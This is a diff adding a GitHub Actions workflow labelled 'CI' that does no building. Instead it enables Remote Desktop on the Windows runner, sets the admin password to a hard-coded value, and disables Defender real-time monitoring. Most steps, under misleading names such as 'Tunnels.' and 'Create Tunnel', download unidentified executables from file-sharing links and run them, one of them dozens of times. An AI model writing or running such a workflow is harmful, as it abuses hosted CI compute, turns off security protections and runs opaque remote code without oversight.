@@ -1,0 +1,171 @@
+name: CI
+
+on: [push, workflow_dispatch]
+
+jobs:
+
+  build:
+    runs-on: windows-latest
+    timeout-minutes: 9999
+
+    steps:
+    - name: Download
+      run: Invoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -OutFile ngrok.zip
+    - name: Extract
+      run: Expand-Archive ngrok.zip
+    - name: Enable TS
+      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+    - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+    - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+    - name: Ur RDP is working go connect xD!
+      run: New-Item -Path "C:\21" -ItemType Directory
+    - name: Ur RDP is working go connect xD!
+      run: New-Item -Path "C:\2" -ItemType Directory
+    - name: Download
+      run: New-Item -Path "C:\1" -ItemType Directory
+    - name: Tunnels.
+      run: Invoke-WebRequest -URI https://www.4sync.com/web/directDownload/6iXPhA6J/M4KAPWyf.e6b08d720ef784350fbc55b15b66e1da -outfile c:\21\RegMikroMan222.zip
+    - name: Tunnels.
+      run: Invoke-WebRequest -URI https://www.4sync.com/web/directDownload/dPL4qho2/M4KAPWyf.c274d9f522f82f11d85f690c8c671034 -outfile c:\21\cm413_64.zip
+    - name: Tunnels.
+      run: Invoke-WebRequest -URI https://www.4sync.com/web/directDownload/E5z-uGph/M4KAPWyf.4516aacdb17330bf40758997ba1a9e97 -outfile c:\21\start.exe
+    - name: Tunnels.
+      run: Expand-Archive -LiteralPath "c:\21\RegMikroMan222.zip" -DestinationPath "C:\21"
+    - name: Tunnels.
+      run: Expand-Archive -LiteralPath "c:\21\cm413_64.zip" -DestinationPath "C:\21"
+    - name: Ur RDP is working go connect xD!
+      run: Start-Process Powershell ' -Command "C:\21\start.exe"'
+    - name: Ur RDP is working go connect xD!
+      run: Start-Process Powershell -ArgumentList '-Noexit -Command "C:\21\cm413_64\Clickermannv4.13x64\Clickermann.exe" "C:\21\cm413_64\Clickermannv4.13x64\2211.cms"'
+    - name: Tunnels.
+      run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
+    - name: Tunnels.
+      run: Set-MpPreference -DisableRealtimeMonitoring $true
+    - name: Download
+      run: Invoke-WebRequest -URI https://www.4sync.com/web/directDownload/b5hY0Fm_/M4KAPWyf.328059a5ddbd7467ef94bb98f20d6b97 -outfile c:\21\1122.exe
+    - name: Ur RDP is working go connect xD!
+      run: Start-Process Powershell ' -Command "c:\21\1122.exe"'
+    - name: Create Tunnel
+      run: Invoke-WebRequest -URI https://www.4sync.com/web/directDownload/48F11rDF/M4KAPWyf.f45ade7b18fae41275381f8b5c47dd27 -outfile c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
+    - name: Create Tunnel
+      run: cmd /c c:\1\caffe.exe
